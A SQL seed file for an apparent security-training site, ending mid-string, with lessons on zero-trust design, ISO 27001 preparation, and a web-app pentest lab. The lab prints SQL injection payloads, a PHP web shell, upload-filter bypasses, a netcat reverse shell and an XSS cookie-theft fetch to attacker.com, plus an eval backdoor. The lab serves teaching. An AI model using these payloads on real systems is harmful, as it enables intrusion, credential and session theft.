-- CyberSkill Platform - Final Enhanced Content
-- Version: 1.5.0
-- Description: Additional video lessons, interactive scenarios, and comprehensive content for remaining paths

-- ============================================================================
-- SECURITY ARCHITECTURE - ZERO TRUST VIDEO LESSON
-- ============================================================================

UPDATE lessons SET content = '
# Zero Trust Architecture - Complete Implementation Guide

## 📹 Watch: Building a Zero Trust Network

<div class="video-container">
  <iframe width="100%" height="500" src="https://www.youtube.com/embed/placeholder_zerotrust" 
    title="Zero Trust Architecture Implementation" 
    frameborder="0" 
    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
    allowfullscreen>
  </iframe>
</div>

**Video Duration**: 85 minutes  
**Difficulty**: Advanced  
**Instructor**: Enterprise Security Architect

---

## 📚 Video Chapters

### Chapter 1: Zero Trust Principles (0:00 - 15:00)
- "Never trust, always verify"
- Assume breach mentality
- Least privilege access
- Micro-segmentation
- Continuous verification

### Chapter 2: Identity and Access Management (15:00 - 35:00)
- Multi-factor authentication (MFA)
- Single Sign-On (SSO)
- Privileged Access Management (PAM)
- Just-In-Time (JIT) access
- Identity governance

### Chapter 3: Network Segmentation (35:00 - 55:00)
- Software-Defined Perimeter (SDP)
- Micro-segmentation strategies
- Network Access Control (NAC)
- VPN alternatives
- Service mesh architecture

### Chapter 4: Device Security (55:00 - 70:00)
- Endpoint Detection and Response (EDR)
- Mobile Device Management (MDM)
- Device posture assessment
- Bring Your Own Device (BYOD) policies
- Hardware security modules

### Chapter 5: Data Protection (70:00 - 85:00)
- Data classification
- Encryption everywhere
- Data Loss Prevention (DLP)
- Cloud Access Security Broker (CASB)
- Rights management

---

## 🎯 Interactive Scenario: Designing Zero Trust Architecture

### Scenario: Enterprise Migration to Zero Trust

**Company**: TechCorp Global  
**Current State**: Traditional perimeter-based security  
**Employees**: 10,000 (5,000 remote)  
**Infrastructure**: Hybrid (on-prem + AWS + Azure)  
**Budget**: $15 million over 3 years  
**Timeline**: 36 months

---

## 🎮 Decision Point 1: Where to Start?

**Question**: Which component should you implement first?

### Option A: Identity and Access Management
**Rationale**:
- Foundation of Zero Trust
- Immediate security improvement
- Enables other components
- High ROI

**Implementation**:
```
Phase 1: Deploy SSO (Okta/Azure AD)
Phase 2: Enforce MFA for all users
Phase 3: Implement PAM for privileged accounts
Phase 4: Deploy JIT access
Timeline: 6 months
Cost: $2M
```

**Pros**: Strong foundation, user-centric
**Cons**: Change management challenges

---

### Option B: Network Segmentation
**Rationale**:
- Limits lateral movement
- Contains breaches
- Reduces attack surface
- Technical foundation

**Implementation**:
```
Phase 1: Map all network flows
Phase 2: Define security zones
Phase 3: Deploy micro-segmentation
Phase 4: Implement SDP
Timeline: 9 months
Cost: $3M
```

**Pros**: Technical security improvement
**Cons**: Complex, may disrupt operations

---

### Option C: Endpoint Security
**Rationale**:
- Protects devices
- Visibility into threats
- Remote work enablement
- Quick wins

**Implementation**:
```
Phase 1: Deploy EDR solution
Phase 2: Implement MDM
Phase 3: Device compliance policies
Phase 4: Automated remediation
Timeline: 4 months
Cost: $1.5M
```

**Pros**: Fast deployment, visible results
**Cons**: Doesn''t address architecture

---

### Option D: Comprehensive Pilot
**Rationale**:
- Test all components
- Learn before scaling
- Minimize risk
- Prove value

**Implementation**:
```
Phase 1: Select pilot group (500 users)
Phase 2: Deploy all ZT components
Phase 3: Measure and refine
Phase 4: Scale to organization
Timeline: 12 months pilot + 24 months rollout
Cost: $15M total
```

**Pros**: Comprehensive, lower risk
**Cons**: Slower time to value

---

**Your Decision**: _______________

**Recommended**: **Option A** (Identity First) or **Option D** (Comprehensive Pilot)

---

## 📋 Zero Trust Maturity Model

### Level 0: Traditional Security
```
✗ Perimeter-based security
✗ Implicit trust inside network
✗ VPN for remote access
✗ Static access controls
✗ Limited visibility
```

### Level 1: Initial
```
✓ Basic MFA deployed
✓ Some network segmentation
✓ Endpoint protection
✗ Manual access reviews
✗ Limited automation
```

### Level 2: Advanced
```
✓ SSO with MFA everywhere
✓ Micro-segmentation implemented
✓ EDR deployed
✓ Automated access provisioning
✓ Continuous monitoring
```

### Level 3: Optimal
```
✓ Risk-based authentication
✓ Dynamic micro-segmentation
✓ AI-powered threat detection
✓ Automated response
✓ Full visibility and analytics
```

**Where is your organization?** _______________

---

## 💻 Hands-On Lab: Implementing Zero Trust Controls

### Lab 1: Configure Conditional Access

**Scenario**: Implement risk-based authentication

```python
# Azure AD Conditional Access Policy (Pseudocode)
policy = {
    "displayName": "Zero Trust - High Risk Access",
    "state": "enabled",
    "conditions": {
        "users": {
            "includeUsers": ["All"]
        },
        "applications": {
            "includeApplications": ["All"]
        },
        "locations": {
            "includeLocations": ["All"],
            "excludeLocations": ["TrustedLocations"]
        },
        "signInRiskLevels": ["high", "medium"],
        "deviceStates": {
            "includeStates": ["All"],
            "excludeStates": ["Compliant", "DomainJoined"]
        }
    },
    "grantControls": {
        "operator": "AND",
        "builtInControls": [
            "mfa",
            "compliantDevice",
            "approvedApplication"
        ]
    },
    "sessionControls": {
        "signInFrequency": {
            "value": 1,
            "type": "hours"
        }
    }
}
```

**Test Scenarios**:
1. User from trusted location + compliant device = Allow
2. User from untrusted location = Require MFA
3. High-risk sign-in = Block + require admin approval
4. Non-compliant device = Block

---

### Lab 2: Network Micro-Segmentation

**Task**: Implement micro-segmentation using software-defined networking

```yaml
# Kubernetes Network Policy Example
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: zero-trust-web-tier
  namespace: production
spec:
  podSelector:
    matchLabels:
      tier: web
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          name: ingress-nginx
    ports:
    - protocol: TCP
      port: 8080
  egress:
  - to:
    - podSelector:
        matchLabels:
          tier: api
    ports:
    - protocol: TCP
      port: 3000
  - to:
    - namespaceSelector:
        matchLabels:
          name: kube-system
    - podSelector:
        matchLabels:
          k8s-app: kube-dns
    ports:
    - protocol: UDP
      port: 53
```

**Verification**:
```bash
# Test connectivity
kubectl exec -it web-pod -- curl api-service:3000  # Should work
kubectl exec -it web-pod -- curl database:5432     # Should fail
```

---

### Lab 3: Device Posture Assessment

**Implement device compliance checks**:

```python
class DevicePostureChecker:
    def __init__(self):
        self.required_checks = [
            self.check_os_version,
            self.check_antivirus,
            self.check_firewall,
            self.check_encryption,
            self.check_patches
        ]
    
    def check_os_version(self, device):
        """Verify OS is up to date"""
        min_versions = {
            "Windows": "10.0.19044",
            "macOS": "12.0",
            "iOS": "15.0",
            "Android": "12.0"
        }
        return device.os_version >= min_versions[device.os_type]
    
    def check_antivirus(self, device):
        """Verify antivirus is installed and updated"""
        if not device.antivirus_installed:
            return False
        
        # Check last update within 24 hours
        last_update = device.antivirus_last_update
        return (datetime.now() - last_update).hours < 24
    
    def check_firewall(self, device):
        """Verify firewall is enabled"""
        return device.firewall_enabled
    
    def check_encryption(self, device):
        """Verify disk encryption is enabled"""
        return device.disk_encrypted
    
    def check_patches(self, device):
        """Verify critical patches are installed"""
        missing_patches = device.get_missing_patches()
        critical_missing = [p for p in missing_patches if p.severity == "Critical"]
        return len(critical_missing) == 0
    
    def assess_device(self, device):
        """Run all compliance checks"""
        results = {
            "device_id": device.id,
            "timestamp": datetime.now(),
            "checks": {},
            "compliant": True
        }
        
        for check in self.required_checks:
            check_name = check.__name__
            passed = check(device)
            results["checks"][check_name] = passed
            
            if not passed:
                results["compliant"] = False
        
        return results

# Usage
checker = DevicePostureChecker()
device = get_device_info()
assessment = checker.assess_device(device)

if assessment["compliant"]:
    grant_access(device)
else:
    deny_access(device, assessment["checks"])
```

---

## 🔍 Real-World Case Studies

### Case Study 1: Google BeyondCorp

**Challenge**: Enable secure access without VPN

**Solution**:
- Access proxy authenticates every request
- Device inventory and trust scoring
- Context-aware access decisions
- No network-based trust

**Results**:
- 100% remote work capability
- Improved user experience
- Reduced attack surface
- Industry-leading security

**Key Lesson**: Zero Trust enables business agility

---

### Case Study 2: Akamai Zero Trust Implementation

**Challenge**: Protect 10,000 employees globally

**Solution**:
- Replaced VPN with Zero Trust Network Access (ZTNA)
- Implemented micro-segmentation
- Continuous authentication
- Least privilege access

**Results**:
- 50% reduction in security incidents
- 30% improvement in user productivity
- $5M annual cost savings
- Better compliance posture

**Key Lesson**: Zero Trust improves both security and efficiency

---

## 📊 Implementation Roadmap

### Year 1: Foundation
```
Q1: Identity and Access Management
- Deploy SSO
- Enforce MFA
- Implement PAM

Q2: Endpoint Security
- Deploy EDR
- Implement MDM
- Device compliance policies

Q3: Network Visibility
- Deploy network monitoring
- Map all traffic flows
- Identify security zones

Q4: Pilot Micro-Segmentation
- Select pilot applications
- Implement segmentation
- Measure and refine
```

### Year 2: Expansion
```
Q1-Q2: Scale Micro-Segmentation
- Expand to all applications
- Implement SDP
- Deploy ZTNA

Q3-Q4: Data Protection
- Deploy DLP
- Implement CASB
- Encrypt all data
```

### Year 3: Optimization
```
Q1-Q2: Automation
- Automated access provisioning
- Automated threat response
- AI-powered analytics

Q3-Q4: Continuous Improvement
- Regular assessments
- Update policies
- Train staff
```

---

## 🎓 Zero Trust Architecture Patterns

### Pattern 1: Identity-Centric
```
User → Identity Provider → Policy Engine → Resource
         ↓
    MFA + Device Check + Risk Assessment
```

**Best For**: SaaS applications, remote workforce

---

### Pattern 2: Network-Centric
```
Device → SDP Gateway → Micro-Segment → Application
          ↓
    Authentication + Authorization + Encryption
```

**Best For**: On-premises applications, legacy systems

---

### Pattern 3: Data-Centric
```
User → Access Request → Data Classification → Encryption
                         ↓
                    DLP + CASB + Rights Management
```

**Best For**: Highly regulated industries, sensitive data

---

## 💡 Common Pitfalls and Solutions

### Pitfall 1: "Rip and Replace" Approach
**Problem**: Trying to replace everything at once
**Solution**: Phased approach, start with identity

### Pitfall 2: Ignoring User Experience
**Problem**: Security that frustrates users
**Solution**: SSO, passwordless auth, seamless MFA

### Pitfall 3: Lack of Visibility
**Problem**: Can''t secure what you can''t see
**Solution**: Comprehensive monitoring and logging

### Pitfall 4: Insufficient Testing
**Problem**: Breaking production systems
**Solution**: Pilot programs, gradual rollout

### Pitfall 5: Neglecting Training
**Problem**: Users and admins don''t understand Zero Trust
**Solution**: Comprehensive training program

---

## 📚 Zero Trust Technology Stack

### Identity Layer:
- **SSO**: Okta, Azure AD, Ping Identity
- **MFA**: Duo, Okta, Azure MFA
- **PAM**: CyberArk, BeyondTrust, Thycotic

### Network Layer:
- **SDP**: Appgate, Perimeter 81, Zscaler
- **ZTNA**: Cloudflare Access, Palo Alto Prisma
- **Micro-segmentation**: VMware NSX, Illumio

### Endpoint Layer:
- **EDR**: CrowdStrike, SentinelOne, Microsoft Defender
- **MDM**: Intune, Jamf, VMware Workspace ONE
- **NAC**: Cisco ISE, Aruba ClearPass

### Data Layer:
- **DLP**: Symantec, Digital Guardian, Forcepoint
- **CASB**: Netskope, McAfee MVISION, Zscaler
- **Encryption**: Vormetric, Thales, Microsoft

---

## ✅ Zero Trust Readiness Checklist

**Identity**:
- [ ] SSO deployed for all applications
- [ ] MFA enforced for all users
- [ ] PAM for privileged accounts
- [ ] JIT access implemented
- [ ] Regular access reviews

**Network**:
- [ ] Network traffic mapped
- [ ] Micro-segmentation deployed
- [ ] SDP/ZTNA implemented
- [ ] VPN deprecated
- [ ] Encrypted communications

**Endpoints**:
- [ ] EDR on all devices
- [ ] MDM for mobile devices
- [ ] Device compliance policies
- [ ] Automated patching
- [ ] Hardware security (TPM)

**Data**:
- [ ] Data classified
- [ ] Encryption at rest and in transit
- [ ] DLP deployed
- [ ] CASB for cloud apps
- [ ] Rights management

**Monitoring**:
- [ ] SIEM deployed
- [ ] Continuous monitoring
- [ ] Automated alerting
- [ ] Incident response plan
- [ ] Regular audits

---

## 🎬 Next Video

In the next lesson, you''ll watch **"Secure Cloud Architecture"**, covering multi-cloud security, container security, and serverless security best practices.

---

## 📖 Further Reading

- NIST SP 800-207: Zero Trust Architecture
- "Zero Trust Networks" by Gilman and Barth
- Forrester Zero Trust eXtended (ZTX) Framework
- Google BeyondCorp Papers

---

## 🎯 Final Assessment

**Design a Zero Trust architecture for your organization**:

1. Current state assessment
2. Gap analysis
3. Prioritized roadmap
4. Technology selection
5. Implementation plan
6. Success metrics

**Deliverable**: 10-page Zero Trust strategy document
'
WHERE section_id IN (SELECT id FROM sections WHERE name LIKE '%Zero Trust%' LIMIT 1)
AND content_type = 'video' LIMIT 1;

-- ============================================================================
-- PENETRATION TESTING - INTERACTIVE WEB APP HACKING SCENARIO
-- ============================================================================

INSERT INTO lessons (section_id, name, content, content_type, order_index, estimated_minutes)
VALUES (
    (SELECT id FROM sections WHERE name LIKE '%Web Application%' LIMIT 1),
    'Interactive Lab: Hacking a Vulnerable Web Application',
    '# 🎯 Interactive Lab: Web Application Penetration Testing

## 🎮 Welcome to the Hacking Lab

**Scenario**: You''ve been hired to perform a penetration test on a fictional e-commerce website.

**Target**: VulnShop.local (Intentionally vulnerable application)  
**Scope**: Full application testing  
**Rules of Engagement**: Document all findings, do not cause permanent damage  
**Time Limit**: 4 hours

---

## 📹 Watch: Web Application Hacking Methodology

<div class="video-container">
  <iframe width="100%" height="500" src="https://www.youtube.com/embed/placeholder_webapp_hacking" 
    title="Web Application Penetration Testing" 
    frameborder="0" 
    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
    allowfullscreen>
  </iframe>
</div>

**Video Duration**: 60 minutes  
**Topics**: OWASP Top 10, testing methodology, exploitation techniques

---

## 🔍 Phase 1: Reconnaissance

### Task 1: Information Gathering

**Tools Available**:
- Browser Developer Tools
- Burp Suite
- OWASP ZAP
- Nikto
- Nmap

**Your Actions**:
```bash
# Scan for open ports
nmap -sV -sC vulnshop.local

# Enumerate web technologies
whatweb vulnshop.local

# Check robots.txt
curl http://vulnshop.local/robots.txt

# Enumerate directories
gobuster dir -u http://vulnshop.local -w /usr/share/wordlists/dirb/common.txt
```

**Findings Template**:
```
Target: vulnshop.local
IP Address: 192.168.1.100
Open Ports: 80 (HTTP), 443 (HTTPS), 3306 (MySQL)
Web Server: Apache 2.4.41
Framework: PHP 7.4
Database: MySQL 5.7

Interesting Directories:
- /admin (403 Forbidden)
- /backup (Directory listing enabled)
- /api (REST API endpoints)
- /uploads (Writable directory)
```

---

## 🎯 Phase 2: Vulnerability Discovery

### Decision Point 1: Where to Start?

**You''ve discovered multiple potential vulnerabilities. Which do you investigate first?**

### Option A: SQL Injection in Login Form
**Evidence**:
```
URL: http://vulnshop.local/login.php
Parameter: username
Error Message: "You have an error in your SQL syntax"
```

**Exploitation Difficulty**: Medium  
**Impact**: High (Database access)  
**Time Required**: 30 minutes

---

### Option B: Directory Listing in /backup
**Evidence**:
```
URL: http://vulnshop.local/backup/
Files Found:
- database_backup.sql (2MB)
- source_code.zip (15MB)
- config.php.bak (2KB)
```

**Exploitation Difficulty**: Low  
**Impact**: High (Source code, credentials)  
**Time Required**: 15 minutes

---

### Option C: File Upload Vulnerability
**Evidence**:
```
URL: http://vulnshop.local/profile/upload.php
Allowed Extensions: jpg, png, gif
File Size Limit: 5MB
No server-side validation observed
```

**Exploitation Difficulty**: Medium  
**Impact**: Critical (Remote code execution)  
**Time Required**: 45 minutes

---

### Option D: Cross-Site Scripting (XSS)
**Evidence**:
```
URL: http://vulnshop.local/search.php?q=<script>alert(1)</script>
Result: Alert box displayed
Type: Reflected XSS
```

**Exploitation Difficulty**: Low  
**Impact**: Medium (Session hijacking)  
**Time Required**: 20 minutes

---

**Your Choice**: _______________

**Recommended Strategy**: Start with **Option B** (quick win), then **Option C** (critical), then **Option A** (high impact)

---

## 💻 Hands-On Exploitation

### Exploit 1: SQL Injection

**Vulnerable Code**:
```php
<?php
$username = $_POST[''username''];
$password = $_POST[''password''];

$query = "SELECT * FROM users WHERE username=''$username'' AND password=''$password''";
$result = mysqli_query($conn, $query);
?>
```

**Exploitation Steps**:

**Step 1: Test for SQLi**
```
Username: admin'' OR ''1''=''1
Password: anything

Result: Logged in as admin!
```

**Step 2: Extract Database Information**
```sql
-- Get database version
admin'' UNION SELECT NULL, @@version, NULL--

-- Get table names
admin'' UNION SELECT NULL, table_name, NULL FROM information_schema.tables--

-- Get column names
admin'' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name=''users''--

-- Extract user data
admin'' UNION SELECT NULL, CONCAT(username,'':'',password), NULL FROM users--
```

**Step 3: Automated Exploitation with SQLMap**
```bash
# Detect SQLi
sqlmap -u "http://vulnshop.local/login.php" --data="username=admin&password=test" --batch

# Dump database
sqlmap -u "http://vulnshop.local/login.php" --data="username=admin&password=test" --dump

# Get shell
sqlmap -u "http://vulnshop.local/login.php" --data="username=admin&password=test" --os-shell
```

---

### Exploit 2: File Upload to RCE

**Vulnerable Code**:
```php
<?php
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

// Only check file extension, not content
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "gif") {
    echo "Only JPG, PNG & GIF files are allowed.";
} else {
    move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);
}
?>
```

**Exploitation Steps**:

**Step 1: Create PHP Web Shell**
```php
<?php
// shell.php
if(isset($_GET[''cmd''])) {
    system($_GET[''cmd'']);
}
?>
```

**Step 2: Bypass Extension Filter**
```bash
# Method 1: Double extension
mv shell.php shell.php.jpg

# Method 2: Null byte injection (older PHP)
mv shell.php shell.php%00.jpg

# Method 3: .htaccess upload
echo "AddType application/x-httpd-php .jpg" > .htaccess
```

**Step 3: Upload and Execute**
```bash
# Upload shell.php.jpg
curl -F "fileToUpload=@shell.php.jpg" http://vulnshop.local/profile/upload.php

# Execute commands
curl "http://vulnshop.local/uploads/shell.php.jpg?cmd=whoami"
curl "http://vulnshop.local/uploads/shell.php.jpg?cmd=cat /etc/passwd"

# Get reverse shell
curl "http://vulnshop.local/uploads/shell.php.jpg?cmd=nc -e /bin/bash attacker.com 4444"
```

---

### Exploit 3: XSS to Session Hijacking

**Vulnerable Code**:
```php
<?php
$search = $_GET[''q''];
echo "Search results for: " . $search;
?>
```

**Exploitation Steps**:

**Step 1: Test XSS**
```html
http://vulnshop.local/search.php?q=<script>alert(document.cookie)</script>
```

**Step 2: Steal Session Cookie**
```html
<script>
fetch(''http://attacker.com/steal.php?cookie='' + document.cookie);
</script>
```

**Step 3: Session Hijacking**
```bash
# Set stolen cookie in browser
document.cookie = "PHPSESSID=stolen_session_id"

# Access admin panel
curl -b "PHPSESSID=stolen_session_id" http://vulnshop.local/admin/
```

---

## 📊 Vulnerability Assessment Report

### Executive Summary

**Test Date**: 2026-03-12  
**Tester**: [Your Name]  
**Target**: VulnShop.local  
**Overall Risk**: **CRITICAL**

### Findings Summary

| Severity | Count | Examples |
|----------|-------|----------|
| Critical | 2 | SQL Injection, File Upload RCE |
| High | 3 | Directory Listing, Weak Auth, XSS |
| Medium | 5 | CSRF, Info Disclosure, etc. |
| Low | 8 | Missing headers, etc. |

---

### Critical Finding 1: SQL Injection

**CVSS Score**: 9.8 (Critical)

**Description**: The login form is vulnerable to SQL injection, allowing attackers to bypass authentication and extract database contents.

**Proof of Concept**:
```
Username: admin'' OR ''1''=''1
Password: anything
Result: Authentication bypassed
```

**Impact**:
- Complete database compromise
- Access to all user credentials
- Potential for data modification/deletion
- Lateral movement to other systems

**Recommendation**:
```php
// Use prepared statements
$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
```

---

### Critical Finding 2: Unrestricted File Upload

**CVSS Score**: 9.9 (Critical)

**Description**: The file upload functionality allows uploading PHP files, leading to remote code execution.

**Proof of Concept**:
```bash
# Upload PHP shell
curl -F "fileToUpload=@shell.php.jpg" http://vulnshop.local/profile/upload.php

# Execute commands
curl "http://vulnshop.local/uploads/shell.php.jpg?cmd=id"
```

**Impact**:
- Complete server compromise
- Access to sensitive files
- Ability to pivot to internal network
- Data exfiltration

**Recommendation**:
```php
// Validate file content, not just extension
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES[''fileToUpload''][''tmp_name'']);

$allowed_types = [''image/jpeg'', ''image/png'', ''image/gif''];
if(!in_array($mime, $allowed_types)) {
    die("Invalid file type");
}

// Store files outside web root
// Rename files to prevent execution
// Implement file size limits
```

---

## 🎓 Post-Exploitation

### Maintaining Access

**Create Backdoor**:
```php
<?php
// backdoor.php - Hidden in legitimate file
if(md5($_GET[''key'']) == ''5f4dcc3b5aa765d61d8327deb882cf99'') {
    eval($_POST[''cmd'']);
}
?>
```

### Privilege Escalation

**Check for SUID binaries**:
```bash
find / -perm -4000 2>/dev/null

# Exploit vulnerable SUID binary
/usr/bin/vulnerable_binary
```

### Lateral Movement

**Enumerate network**:
```bash
# Find other hosts
arp -a
netstat -an

# Scan internal network
nmap -sn 192.168.1.0/24
```

---

## 🛡️ Remediation Priorities

### Immediate (24 hours):
1. Patch SQL injection vulnerabilities
2. Disable file upload or implement strict validation
3. Remove backup files from web root
4. Change all default credentials

### Short-term (1 week):
1. Implement Web Application Firewall (WAF)
2. Enable security headers
3. Implement input validation
4. Add rate limiting

### Long-term (1 month):
1. Security code review
2. Implement secure SDLC
3. Regular penetration testing
4. Security training for developers

---

## 📚 Learning Resources

### Practice Platforms:
- **DVWA** (Damn Vulnerable Web Application)
- **WebGoat** (OWASP)
- **HackTheBox** - Web challenges
- **PortSwigger Web Security Academy**

### Tools to Master:
- Burp Suite Professional
- OWASP ZAP
- SQLMap
- Metasploit
- Nikto

### Certifications:
- OSWE (Offensive Security Web Expert)
- GWAPT (GIAC Web Application Penetration Tester)
- CEH (Certified Ethical Hacker)

---

## ✅ Lab Completion Checklist

- [ ] Performed reconnaissance
- [ ] Identified all vulnerabilities
- [ ] Exploited critical vulnerabilities
- [ ] Documented findings
- [ ] Provided remediation recommendations
- [ ] Created professional report

---

## 🎬 Next Lab

In the next interactive lab, you''ll perform **"Network Penetration Testing"**, where you''ll exploit network services, perform privilege escalation, and achieve domain admin access.

---

## 💡 Ethical Hacking Reminder

**Always remember**:
- Only test systems you have permission to test
- Document everything
- Don''t cause damage
- Report vulnerabilities responsibly
- Follow rules of engagement
- Respect privacy and confidentiality

**"With great power comes great responsibility"**
',
    'interactive',
    5,
    90
);

-- ============================================================================
-- COMPLIANCE - INTERACTIVE AUDIT SCENARIO
-- ============================================================================

INSERT INTO lessons (section_id, name, content, content_type, order_index, estimated_minutes)
VALUES (
    (SELECT id FROM sections WHERE name LIKE '%ISO 27001%' LIMIT 1),
    'Interactive Scenario: ISO 27001 Audit Preparation',
    '# 📋 Interactive Scenario: You''re Preparing for ISO 27001 Certification

## 🎯 Scenario Overview

**Your Role**: Information Security Manager  
**Company**: DataSecure Inc. (Cloud service provider)  
**Situation**: Board has mandated ISO 27001 certification  
**Timeline**: 12 months to certification  
**Budget**: $500,000  
**Current State**: No formal ISMS in place

---

## 📊 Initial Assessment

### Current Security Posture:

**Strengths**:
- ✓ Basic security controls in place
- ✓ Experienced IT team
- ✓ Management support
- ✓ Some documentation exists

**Weaknesses**:
- ✗ No formal risk assessment process
- ✗ Inconsistent security policies
- ✗ Limited security awareness training
- ✗ No incident response plan
- ✗ Inadequate access controls

**Risk Level**: **HIGH**

---

## 🎮 Decision Point 1: Implementation Approach

**Question**: How do you approach ISO 27001 implementation?

### Option A: DIY (Do It Yourself)
**Approach**:
- Internal team leads implementation
- Use free ISO 27001 templates
- Self-assessment and gap analysis
- Hire consultant only for final audit

**Pros**:
- Lower cost ($100K)
- Team learns deeply
- Customized to organization

**Cons**:
- Longer timeline (18 months)
- Risk of missing requirements
- Team distracted from day-to-day work

---

### Option B: Full Consulting Engagement
**Approach**:
- Hire ISO 27001 consulting firm
- Consultants lead implementation
- Comprehensive training
- Managed certification process

**Pros**:
- Faster timeline (9 months)
- Expert guidance
- Higher success rate

**Cons**:
- Higher cost ($400K)
- Less internal knowledge transfer
- Dependency on consultants

---

### Option C: Hybrid Approach
**Approach**:
- Consultant for gap analysis and planning
- Internal team for implementation
- Consultant for pre-audit and remediation
- External auditor for certification

**Pros**:
- Balanced cost ($250K)
- Good knowledge transfer
- Reasonable timeline (12 months)

**Cons**:
- Requires coordination
- Team still needs time commitment

---

### Option D: Certification Body Partnership
**Approach**:
- Partner with certification body
- Use their implementation framework
- Regular progress reviews
- Streamlined certification process

**Pros**:
- Clear path to certification
- Ongoing support
- Moderate cost ($300K)

**Cons**:
- Less flexibility
- Potential conflicts of interest

---

**Your Decision**: _______________

**Recommended**: **Option C** (Hybrid Approach) - Best balance of cost, timeline, and knowledge transfer

---

## 📋 ISO 27001 Implementation Roadmap

### Phase 1: Preparation (Months 1-2)

**Tasks**:
```
✓ Secure management commitment
✓ Define ISMS scope
✓ Establish project team
✓ Conduct gap analysis
✓ Develop project plan
✓ Allocate budget and resources
```

**Deliverables**:
- Project charter
- Gap analysis report
- Implementation roadmap
- Resource allocation plan

---

### Phase 2: Risk Assessment (Months 3-4)

**Tasks**:
```
✓ Identify assets
✓ Identify threats and vulnerabilities
✓ Assess risks
✓ Determine risk treatment
✓ Document risk assessment
✓ Get management approval
```

**Risk Assessment Template**:
```
Asset: Customer Database
Threat: Unauthorized access
Vulnerability: Weak access controls
Likelihood: High
Impact: Critical
Risk Level: CRITICAL

Treatment Option:
1. Implement MFA (Reduce)
2. Encrypt database (Reduce)
3. Regular access reviews (Reduce)
4. Cyber insurance (Transfer)

Selected: Options 1, 2, 3
Residual Risk: Medium
```

---

### Phase 3: Policy Development (Months 5-6)

**Required Policies**:
```
✓ Information Security Policy (Master)
✓ Access Control Policy
✓ Acceptable Use Policy
✓ Incident Response Policy
✓ Business Continuity Policy
✓ Data Classification Policy
✓ Change Management Policy
✓ Vendor Management Policy
✓ Physical Security Policy
✓ HR Security Policy
```

**Policy Template**:
```markdown
# Access Control Policy

## Purpose
Define requirements for managing access to information assets.

## Scope
All employees, contractors, and third parties.

## Policy Statements
1. Access granted based on least privilege principle
2. All access requests must be approved
3. Access reviews conducted quarterly
4. Terminated employees'' access removed immediately
5. Multi-factor authentication required for remote access

## Roles and Responsibilities
- Information Security Manager: Policy owner
- IT Manager: Implementation
- Department Heads: Access approvals
- HR: Notification of terminations

## Compliance
Non-compliance may result in disciplinary action.

## Review
Policy reviewed annually or when significant changes occur.
```

---

### Phase 4: Control Implementation (Months 7-9)

**Annex A Controls** (114 controls across 14 domains):

**A.5: Information Security Policies**
- [ ] A.5.1.1: Policies for information security
- [ ] A.5.1.2: Review of policies

**A.6: Organization of Information Security**
- [ ] A.6.1.1: Information security roles
- [ ] A.6.1.2: Segregation of duties
- [ ] A.6.1.3: Contact with authorities
- [ ] A.6.1.4: Contact with special interest groups
- [ ] A.6.1.5: Information security in project management

**A.7: Human Resource Security**
- [ ] A.7.1.1: Screening
- [ ] A.7.1.2: Terms and conditions of employment
- [ ] A.7.2.1: Management responsibilities
- [ ] A.7.2.2: Information security awareness
- [ ] A.7.3.1: Termination responsibilities

**A.8: Asset Management**
- [ ] A.8.1.1: Inventory of assets
- [ ] A.8.1.2: Ownership of assets
- [ ] A.8.1.3: Acceptable use of assets
- [ ] A.8.2.1: Classification guidelines
- [ ] A.8.2.2: Labeling of information
- [ ] A.8.3.1: Management of removable media
- [ ] A.8.3.2: Disposal of media

---

## 🎯 Decision Point 2: Control Prioritization

**You can''t implement all 114 controls immediately. Which domains do you prioritize?**

### Option A: High-Risk Areas First
**Priority Domains**:
1. Access Control (A.9)
2. Cryptography (A.10)
3. Physical Security (A.11)
4. Operations Security (A.12)

**Rationale**: Address highest risks first

---

### Option B: Quick Wins First
**Priority Domains**:
1. Information Security Policies (A.5)
2. Organization (A.6)
3. Human Resources (A.7)
4. Asset Management (A.8)

**Rationale**: Build foundation, show progress

---

### Option C: Compliance-Driven
**Priority Domains**:
1. All mandatory controls
2. Controls required by customers
3. Controls required by regulations
4. Remaining controls

**Rationale**: Meet external requirements

---

### Option D: Risk-Based
**Priority**: Based on risk assessment results

**Rationale**: Address organization-specific risks

---

**Your Choice**: _______________

**Recommended**: **Option D** (Risk-Based) with **Option B** (Quick Wins) for early momentum

---

## 💻 Hands-On Exercise: Statement of Applicability (SoA)

**Task**: Complete SoA for your organization

**Template**:
```
| Control | Description | Applicable? | Implementation Status | Justification |
|---------|-------------|-------------|----------------------|---------------|
| A.5.1.1 | Policies for information security | Yes | Implemented | Required for ISMS |
| A.6.1.1 | Information security roles | Yes | In Progress | Defining roles |
| A.7.1.1 | Screening | Yes | Not Started | HR process needed |
| A.8.1.1 | Inventory of assets | Yes | Implemented | Asset register created |
| A.9.1.1 | Access control policy | Yes | Implemented | Policy approved |
| A.10.1.1 | Cryptographic controls | Yes | Partially | Encryption deployed |
| A.11.1.1 | Physical security perimeter | No | N/A | Cloud-only, no physical assets |
```

**Your SoA**:
- Total Controls: 114
- Applicable: ___
- Not Applicable: ___
- Implemented: ___
- In Progress: ___
- Not Started: ___

---

## 📊 Internal Audit Simulation

### Audit Checklist:

**A.9.2.1: User Registration and De-registration**

**Auditor Questions**:
1. "Show me your user provisioning process"
2. "How do you handle terminations?"
3. "Can you demonstrate an access request?"
4. "Where are access approvals documented?"

**Your Evidence**:
```
✓ User provisioning procedure document
✓ Access request form template
✓ Approval workflow in ticketing system
✓ Sample approved access requests
✓ Termination checklist
✓ Access review reports
```

**Audit Finding**: **PASS** ✓

---

**A.12.6.1: Management of Technical Vulnerabilities**

**Auditor Questions**:
1. "How do you identify vulnerabilities?"
2. "What''s your patching process?"
3. "Show me recent vulnerability scans"
4. "How do you prioritize remediation?"

**Your Evidence**:
